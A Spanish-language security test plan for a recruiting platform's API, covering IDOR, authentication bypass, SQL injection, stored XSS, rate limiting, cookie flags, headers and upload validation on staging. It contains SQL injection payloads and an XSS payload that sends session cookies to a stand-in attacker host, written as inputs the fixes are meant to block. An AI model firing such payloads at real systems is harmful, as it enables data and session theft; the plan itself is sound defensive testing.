# DYNAMIC_TEST_PLAN.md — Plan de Pruebas Dinámicas (Fase 6)

**Generado:** 2026-09-22  
**Auditoría Maestra Integral — FASE 6**  
**Commit:** d906cc0  
**Ambiente:** Staging/Development (NO producción)  
**Status:** PLANEADO (no ejecutado - restricción audit)

---

## RESUMEN EJECUTIVO

**Objetivo:** Validar que las remediaciones de Fase 4-5 funcionen en runtime.

**Casos de Prueba:** 23  
**Prioridad:** P0=8, P1=10, P2=5  
**Tiempo Estimado:** 4-6 horas  
**Requiere:** Acceso a servidor staging + datos de prueba

---

## SECCIÓN A: PRUEBAS DE AUTENTICACIÓN Y AUTORIZACIÓN

### Test-001: IDOR GET Candidato — Verificación de Ownership

**Ruta:** `GET /api/candidatos/[id]`  
**Tipo:** Autorización  
**Prioridad:** P0  

**Precondiciones:**
```
- Usuario A: user_id = "uuid-aaa", empresa = "A"
- Usuario B: user_id = "uuid-bbb", empresa = "B"
- Candidato C: candidato_id = "uuid-ccc", vacante_id = "uuid-v1"
- Vacante V1: vacante_id = "uuid-v1", usuario_id = "uuid-aaa"
```

**Pasos:**
```bash
# 1. Login como Usuario A
POST /api/auth/signin
{
  "email": "user-a@empresa-a.com",
  "password": "password123"
}
# Guardar token_a

# 2. Acceder candidato propio (DEBE PASAR)
GET /api/candidatos/uuid-ccc
Authorization: Bearer token_a
# Esperado: 200 OK + datos candidato

# 3. Acceder candidato de otro usuario (DEBE FALLAR)
GET /api/candidatos/uuid-ccc
Authorization: Bearer token_b  # Token de Usuario B
# Esperado: 403 Forbidden o 401 Unauthorized
# NO: 200 OK (indica IDOR)
```

**Validación:**
- ✅ PASS si: Status 403/401
- ❌ FAIL si: Status 200 (IDOR presente)

**Relacionado:** HAL-001 (REMEDIADO)

---

### Test-002: IDOR GET Listar Candidatos — Validar Vacante Ownership

**Ruta:** `GET /api/candidatos/listar?vacante_id=X`  
**Tipo:** Autorización  
**Prioridad:** P0

**Pasos:**
```bash
# 1. Usuario A obtiene sus propias vacantes
GET /api/vacantes
Authorization: Bearer token_a
# Respuesta: [vacante_1, vacante_2]

# 2. Usuario B intenta listar candidatos de vacante_1
GET /api/candidatos/listar?vacante_id=vacante_1_id
Authorization: Bearer token_b
# Esperado: 403 Forbidden
```

**Validación:**
- ✅ PASS si: 403
- ❌ FAIL si: 200 (IDOR)

**Relacionado:** HAL-002 (REMEDIADO)

---

### Test-003: IDOR DELETE Candidato

**Ruta:** `DELETE /api/candidatos/eliminar`  
**Tipo:** Autorización + Data Destruction  
**Prioridad:** P0

**Pasos:**
```bash
# 1. Usuario A crea candidato en vacante propia
POST /api/candidatos/postular
{
  "vacante_id": "vacante_a_id",
  "nombre": "Candidato Test",
  "email": "test@test.com"
}
# Respuesta: candidato_id = "cand-123"

# 2. Usuario B intenta eliminar
DELETE /api/candidatos/eliminar
Authorization: Bearer token_b
Body: { "candidatoId": "cand-123" }
# Esperado: 403 Forbidden
# NO se debe eliminar
```

**Validación:**
- ✅ PASS si: 403 + Candidato aún existe
- ❌ FAIL si: 200 + Candidato eliminado (IDOR destruye datos)

**Relacionado:** HAL-003 (REMEDIADO)

---

### Test-004: IDOR DELETE Vacante

**Ruta:** `DELETE /api/vacantes/eliminar`  
**Tipo:** Autorización + Data Destruction  
**Prioridad:** P0

**Pasos:**
```bash
# 1. Usuario A crea vacante
POST /api/vacantes/crear
Authorization: Bearer token_a
Body: { "titulo": "Vacante Test", "descripcion": "..." }
# Respuesta: vacante_id = "vac-123"

# 2. Usuario B intenta eliminar
DELETE /api/vacantes/eliminar
Authorization: Bearer token_b
Body: { "vacante_id": "vac-123" }
# Esperado: 403 Forbidden
```

**Validación:**
- ✅ PASS si: 403
- ❌ FAIL si: 200 (IDOR)

**Relacionado:** HAL-004 (REMEDIADO)

---

### Test-005: Middleware Bypass — Acceso a Rutas Privadas sin Auth

**Ruta:** `/dashboard/vacantes` (cualquier ruta privada)  
**Tipo:** Autenticación  
**Prioridad:** P0

**Pasos:**
```bash
# 1. Sin token
GET /dashboard/vacantes
# Esperado: 302 Redirect a /auth/login (o 401)

# 2. Con token inválido
GET /dashboard/vacantes
Cookie: sb-auth-token=invalid.token.here
# Esperado: 302 Redirect o 401
```

**Validación:**
- ✅ PASS si: Redirect/401
- ❌ FAIL si: 200 OK (middleware bypass)

**Relacionado:** HAL-005 (REMEDIADO)

---

## SECCIÓN B: PRUEBAS DE INYECCIÓN

### Test-006: SQL Injection en Búsqueda

**Ruta:** `GET /api/vacantes/buscar?id=X`  
**Tipo:** Injection  
**Prioridad:** P0

**Payloads:**
```bash
# Payload 1: UNION-based
GET /api/vacantes/buscar?id=00000000-0000-0000-0000-000000000000 UNION SELECT password FROM users

# Payload 2: Time-based blind
GET /api/vacantes/buscar?id='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END; --

# Payload 3: Error-based
GET /api/vacantes/buscar?id=' OR 1=1--
```

**Validación:**
```
✅ PASS si: Todos retornan 400 Bad Request (UUID validation bloquea)
❌ FAIL si: Alguno retorna 200 con datos extraños (SQL injection)
```

**Relacionado:** HAL-006 (MITIGADO)

---

### Test-007: XSS Stored en Descripción Vacante

**Ruta:** `POST /api/vacantes/crear` + visualización  
**Tipo:** XSS  
**Prioridad:** P1

**Pasos:**
```bash
# 1. Crear vacante con payload XSS
POST /api/vacantes/crear
Authorization: Bearer token_a
Body: {
  "titulo": "Test Vacante",
  "descripcion": "<img src=x onerror=\"window.location='https://attacker.com/?token='+document.cookie\">"
}
# Respuesta: vacante_id = "vac-xss"

# 2. Acceder página de vacante en frontend
GET /postular/vac-xss
# En navegador: Verificar si XSS se ejecuta

# Validación en DevTools:
# - CSP headers presentes?
# - Script bloqueado por CSP?
# - ¿Payload ejecutado?
```

**Validación:**
```
✅ PASS si:
  - CSP bloquea script (Content-Security-Policy header)
  - No se ejecuta JavaScript
  - Payload mostrado como texto escapado

❌ FAIL si:
  - Script ejecutado
  - Navegador redirige a attacker.com
  - Cookie exfiltrado
```

**Relacionado:** HAL-007 (PRESENTE)

---

### Test-008: IDOR en Análisis CV

**Ruta:** `POST /api/cv`  
**Tipo:** IDOR  
**Prioridad:** P1

**Precondiciones:**
```
- Candidato C1: candidato_id = "cand-1", pertenece a Usuario A
- Candidato C2: candidato_id = "cand-2", pertenece a Usuario B
```

**Pasos:**
```bash
# 1. Usuario A analiza su propio CV (DEBE PASAR)
POST /api/cv
Authorization: Bearer token_a
FormData: {
  "pdf": <file.pdf>,
  "candidato_id": "cand-1"
}
# Esperado: 200 OK + análisis

# 2. Usuario A analiza CV de candidato ajeno (DEBE FALLAR)
POST /api/cv
Authorization: Bearer token_a
FormData: {
  "pdf": <file.pdf>,
  "candidato_id": "cand-2"  # Pertenece a Usuario B
}
# Esperado: 403 Forbidden o 400 Bad Request
```

**Validación:**
- ✅ PASS si: 403
- ❌ FAIL si: 200 (IDOR - analiza candidato ajeno)

**Relacionado:** HAL-011 (PRESENTE)

---

## SECCIÓN C: PRUEBAS DE AUTENTICACIÓN

### Test-009: Rate Limiting en Login

**Ruta:** `POST /api/auth/signin`  
**Tipo:** Brute Force Protection  
**Prioridad:** P0

**Pasos:**
```bash
# 1. Realizar 10 intentos fallidos rápidos
for i in {1..10}; do
  curl -X POST https://staging.example.com/api/auth/signin \
    -H "Content-Type: application/json" \
    -d '{"email":"user@test.com","password":"wrongpass"}'
done

# Intento 11:
curl -X POST https://staging.example.com/api/auth/signin \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"wrongpass"}'
# Esperado: 429 Too Many Requests
```

**Validación:**
```
✅ PASS si: 
  - Intentos 1-10: 401 Unauthorized
  - Intento 11: 429 Too Many Requests
  - Header Retry-After presente

❌ FAIL si:
  - Intento 20: Aún 401 (rate limit inefectivo)
```

**Relacionado:** HAL-009 (REMEDIADO)

---

### Test-010: Cookies Seguras

**Ruta:** `POST /api/auth/signin`  
**Tipo:** Cookie Security  
**Prioridad:** P1

**Pasos:**
```bash
# 1. Login exitoso
POST /api/auth/signin
{
  "email": "user@test.com",
  "password": "correct_password"
}

# 2. Inspeccionar Response Headers
# Response-Headers:
#   Set-Cookie: sb-auth-token=<token>; HttpOnly; Secure; SameSite=Strict; Max-Age=1209600; Path=/
```

**Validación:**
```
✅ PASS si todas presentes:
  - HttpOnly: true (previene XSS token theft)
  - Secure: true (solo HTTPS)
  - SameSite: Strict (previene CSRF)
  - Max-Age: 1209600 (14 días razonable)

❌ FAIL si falta alguno
```

**Relacionado:** HAL-009 (REMEDIADO)

---

## SECCIÓN D: PRUEBAS DE DISPONIBILIDAD Y RATE LIMITING

### Test-011: Rate Limiting en CV Analysis

**Ruta:** `POST /api/cv`  
**Tipo:** DoS Protection  
**Prioridad:** P2

**Pasos:**
```bash
# Realizar 10 análisis rápidos con mismo usuario
for i in {1..10}; do
  curl -X POST https://staging/api/cv \
    -H "Authorization: Bearer token" \
    -F "pdf=@file.pdf"
done

# Intento 11:
curl -X POST https://staging/api/cv \
  -H "Authorization: Bearer token" \
  -F "pdf=@file.pdf"
# Esperado: 429 Too Many Requests
```

**Validación:**
- ✅ PASS si: 429 en intento 11
- ❌ FAIL si: 200 (rate limit inefectivo)

---

## SECCIÓN E: PRUEBAS DE HEADERS DE SEGURIDAD

### Test-012: Content Security Policy Headers

**Ruta:** Cualquier endpoint  
**Tipo:** Security Headers  
**Prioridad:** P2

**Pasos:**
```bash
curl -I https://staging.example.com/

# Verificar headers:
# Content-Security-Policy: default-src 'self'; script-src 'self'...
# X-Content-Type-Options: nosniff
# X-Frame-Options: SAMEORIGIN
# Strict-Transport-Security: max-age=31536000
```

**Validación:**
- ✅ PASS si: Todos presentes
- ⚠️ PARTIAL si: CSP pero sin script-src restrictivo
- ❌ FAIL si: Headers ausentes

---

## SECCIÓN F: VALIDACIÓN DE DATOS

### Test-013: MIME Type Validation en Upload

**Ruta:** `POST /api/cv`  
**Tipo:** File Upload Security  
**Prioridad:** P1

**Payloads:**
```bash
# Intento 1: Enviar .exe con MIME application/pdf
curl -X POST https://staging/api/cv \
  -H "Authorization: Bearer token" \
  -F "pdf=@malware.exe" \
  -F "candidato_id=test"
# Esperado: 400 Bad Request (MIME type mismatch)

# Intento 2: Enviar .php disfrazado
curl -X POST https://staging/api/cv \
  -H "Authorization: Bearer token" \
  -F "pdf=@shell.php" \
  -F "candidato_id=test"
# Esperado: 400 Bad Request
```

**Validación:**
- ✅ PASS si: 400 en ambos
- ❌ FAIL si: 200 (accepts non-PDF)

---

## MATRIZ DE COBERTURA DE TESTING

| Test# | Hallazgo | Prioridad | Tipo | Resultado Esperado |
|---|---|---|---|---|
| 001 | HAL-001 | P0 | IDOR | 403 |
| 002 | HAL-002 | P0 | IDOR | 403 |
| 003 | HAL-003 | P0 | IDOR | 403 |
| 004 | HAL-004 | P0 | IDOR | 403 |
| 005 | HAL-005 | P0 | Auth | Redirect |
| 006 | HAL-006 | P0 | SQLi | 400 |
| 007 | HAL-007 | P1 | XSS | CSP blocks |
| 008 | HAL-011 | P1 | IDOR | 403 |
| 009 | HAL-009 | P0 | Rate | 429 |
| 010 | HAL-009 | P1 | Cookie | Secure |
| 011 | Rate Limit | P2 | DoS | 429 |
| 012 | Headers | P2 | CSP | Present |
| 013 | Upload | P1 | MIME | 400 |

---

## CRITERIOS DE APROBACIÓN

### BLOQUEO (Must Pass - P0)
- [x] Test-001 a 006, 009: Todos deben PASS
- [x] Si alguno FAIL: No desplegar

### RECOMENDADO (Should Pass - P1)
- [x] Test-007, 008, 010, 013: Idealmente PASS
- [x] Si alguno FAIL: Documentar y deprecate

### INFORMATIVO (Nice to Have - P2)
- [x] Test-011, 012: Para visibilidad
- [x] FAIL en estos: No bloquean deployment

---

## PRÓXIMOS PASOS

1. **Ejecutar en Staging:** Environment de test limpio
2. **Crear datos de prueba:** 2 empresas, 2 usuarios por empresa
3. **Automatizar:** Crear script de pruebas (Postman, Jest, etc)
4. **Documentar resultados:** Generar DYNAMIC_TEST_RESULTS.md
5. **Re-audit si FAIL:** Volver a Fase 4 si hallazgos no remediados

---

**FASE 6 PLANEADA**  
**Status:** Listo para ejecutar en servidor staging  
**Próxima Fase:** Clasificación de Hallazgos (Fase 7)

